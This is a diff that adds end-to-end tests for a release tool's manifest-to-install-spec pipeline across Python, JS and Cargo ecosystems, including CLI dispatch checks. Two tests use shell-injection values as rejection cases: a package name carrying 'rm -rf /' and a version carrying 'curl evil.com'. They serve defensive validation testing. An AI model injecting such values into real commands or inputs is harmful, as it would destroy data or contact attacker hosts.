@@ -854,3 +854,249 @@ class TestPlanStateConsistency:
         state.save(state_path)
         loaded = RunState.load(state_path)
         assert loaded.is_complete()
+
+
+class TestManifestVerifyInstallPipeline:
+    """End-to-end: save manifest → load_manifest_specs → verify_packages.
+
+    These tests exercise the real data path from manifest JSON on disk
+    through spec extraction and validation, catching field mismatches,
+    ecosystem wiring bugs, and security regex failures at runtime.
+    """
+
+    def test_manifest_to_specs_round_trip(self, tmp_path: Path) -> None:
+        """Manifest save → load_manifest_specs produces correct PackageSpecs."""
+        from releasekit.verify_install import PackageSpec, load_manifest_specs
+
+        manifest = ReleaseManifest(
+            git_sha='abc123',
+            ecosystem='python',
+            packages=[
+                PackageVersion(
+                    name='genkit',
+                    old_version='0.5.0',
+                    new_version='0.6.0',
+                    bump='minor',
+                ),
+                PackageVersion(
+                    name='genkit-tools',
+                    old_version='0.5.0',
+                    new_version='0.5.0',
+                    skipped=True,
+                    reason='unchanged',
+                ),
+                PackageVersion(
+                    name='genkit-plugin-foo',
+                    old_version='0.1.0',
+                    new_version='0.2.0',
+                    bump='minor',
+                ),
+            ],
+            created_at='2026-02-18T00:00:00Z',
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        specs, ecosystem = load_manifest_specs(path)
+
+        # Only non-skipped packages are returned.
+        assert ecosystem == 'python'
+        assert len(specs) == 2
+        assert specs[0] == PackageSpec(name='genkit', version='0.6.0')
+        assert specs[1] == PackageSpec(name='genkit-plugin-foo', version='0.2.0')
+
+        # install_spec produces valid specs for the ecosystem.
+        assert specs[0].install_spec(ecosystem) == 'genkit==0.6.0'
+        assert specs[1].install_spec(ecosystem) == 'genkit-plugin-foo==0.2.0'
+
+    def test_js_ecosystem_round_trip(self, tmp_path: Path) -> None:
+        """JS ecosystem manifest produces @-separated install specs."""
+        from releasekit.verify_install import load_manifest_specs
+
+        manifest = ReleaseManifest(
+            git_sha='def456',
+            ecosystem='js',
+            packages=[
+                PackageVersion(
+                    name='@genkit-ai/core',
+                    old_version='1.0.0',
+                    new_version='1.1.0',
+                    bump='minor',
+                ),
+            ],
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        specs, ecosystem = load_manifest_specs(path)
+        assert ecosystem == 'js'
+        assert len(specs) == 1
+        assert specs[0].install_spec(ecosystem) == '@genkit-ai/core@1.1.0'
+
+    def test_cargo_ecosystem_round_trip(self, tmp_path: Path) -> None:
+        """Cargo ecosystem manifest produces @-separated install specs."""
+        from releasekit.verify_install import load_manifest_specs
+
+        manifest = ReleaseManifest(
+            git_sha='789abc',
+            ecosystem='cargo',
+            packages=[
+                PackageVersion(
+                    name='genkit-rs',
+                    old_version='0.1.0',
+                    new_version='0.2.0',
+                    bump='minor',
+                ),
+            ],
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        specs, ecosystem = load_manifest_specs(path)
+        assert ecosystem == 'cargo'
+        assert specs[0].install_spec(ecosystem) == 'genkit-rs@0.2.0'
+
+    def test_verify_packages_rejects_adversarial_specs(self, tmp_path: Path) -> None:
+        """Adversarial package names are rejected by verify_packages (no mocks).
+
+        This is a security integration test: a malicious manifest with
+        shell-injection package names must be caught by _validate_spec
+        inside verify_packages, without any mocking.
+        """
+        from releasekit.verify_install import PackageSpec, verify_packages
+
+        adversarial_pkgs = [
+            PackageSpec(name='genkit; rm -rf /', version='0.6.0'),
+        ]
+        # verify_packages should reject the spec and return 1.
+        assert verify_packages(adversarial_pkgs, ecosystem='python') == 1
+
+    def test_verify_packages_rejects_command_injection_in_version(self) -> None:
+        """Command injection in version field is rejected."""
+        from releasekit.verify_install import PackageSpec, verify_packages
+
+        pkgs = [
+            PackageSpec(name='genkit', version='0.6.0; curl evil.com'),
+        ]
+        assert verify_packages(pkgs, ecosystem='python') == 1
+
+    def test_verify_packages_empty_manifest(self, tmp_path: Path) -> None:
+        """Empty manifest (all skipped) returns 0 from verify_packages."""
+        from releasekit.verify_install import load_manifest_specs, verify_packages
+
+        manifest = ReleaseManifest(
+            git_sha='abc',
+            ecosystem='python',
+            packages=[
+                PackageVersion(
+                    name='genkit',
+                    old_version='0.5.0',
+                    new_version='0.5.0',
+                    skipped=True,
+                ),
+            ],
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        specs, ecosystem = load_manifest_specs(path)
+        assert specs == []
+        assert verify_packages(specs, ecosystem=ecosystem) == 0
+
+    def test_spec_validation_accepts_all_ecosystems(self) -> None:
+        """install_spec output passes _validate_spec for all ecosystems."""
+        from releasekit.verify_install import PackageSpec, _validate_spec
+
+        spec = PackageSpec(name='genkit', version='0.6.0')
+        for eco in ('python', 'js', 'npm', 'pnpm', 'rust', 'cargo', 'go'):
+            install = spec.install_spec(eco)
+            assert _validate_spec(install), f'_validate_spec rejected {install!r} for ecosystem {eco}'
+
+    def test_cmd_verify_install_with_real_manifest(self, tmp_path: Path) -> None:
+        """_cmd_verify_install reads a real manifest and dispatches correctly.
+
+        Uses an unsupported ecosystem ('dart') so no real package manager
+        is invoked, but the full CLI path is exercised: argparse namespace
+        → manifest load → spec extraction → verify_packages.
+        """
+        import argparse
+
+        from releasekit.cli import _cmd_verify_install
+
+        manifest = ReleaseManifest(
+            git_sha='abc123',
+            ecosystem='dart',
+            packages=[
+                PackageVersion(
+                    name='genkit',
+                    old_version='0.5.0',
+                    new_version='0.6.0',
+                    bump='minor',
+                ),
+            ],
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        args = argparse.Namespace(
+            manifest=str(path),
+            ecosystem='',
+            import_check='',
+            index_url='',
+        )
+        # dart ecosystem is unsupported but returns 0 (warn-only).
+        result = _cmd_verify_install(args)
+        assert result == 0
+
+    def test_cmd_verify_install_missing_manifest(self, tmp_path: Path) -> None:
+        """_cmd_verify_install returns 1 for missing manifest file."""
+        import argparse
+
+        from releasekit.cli import _cmd_verify_install
+
+        args = argparse.Namespace(
+            manifest=str(tmp_path / 'nonexistent.json'),
+            ecosystem='',
+            import_check='',
+            index_url='',
+        )
+        result = _cmd_verify_install(args)
+        assert result == 1
+
+    def test_cmd_verify_install_ecosystem_override(self, tmp_path: Path) -> None:
+        """CLI --ecosystem overrides the manifest ecosystem value."""
+        import argparse
+
+        from releasekit.verify_install import load_manifest_specs
+
+        manifest = ReleaseManifest(
+            git_sha='abc',
+            ecosystem='python',
+            packages=[
+                PackageVersion(
+                    name='genkit',
+                    old_version='0.5.0',
+                    new_version='0.6.0',
+                    bump='minor',
+                ),
+            ],
+        )
+        path = tmp_path / 'manifest.json'
+        manifest.save(path)
+
+        # Simulate CLI --ecosystem override.
+        args = argparse.Namespace(
+            manifest=str(path),
+            ecosystem='dart',
+            import_check='',
+            index_url='',
+        )
+        from releasekit.cli import _cmd_verify_install
+
+        result = _cmd_verify_install(args)
+        # dart is unsupported but returns 0 (warn-only).
+        assert result == 0
+
+        # Verify the manifest ecosystem was 'python' but CLI overrode it.
+        _, manifest_eco = load_manifest_specs(path)
+        assert manifest_eco == 'python'
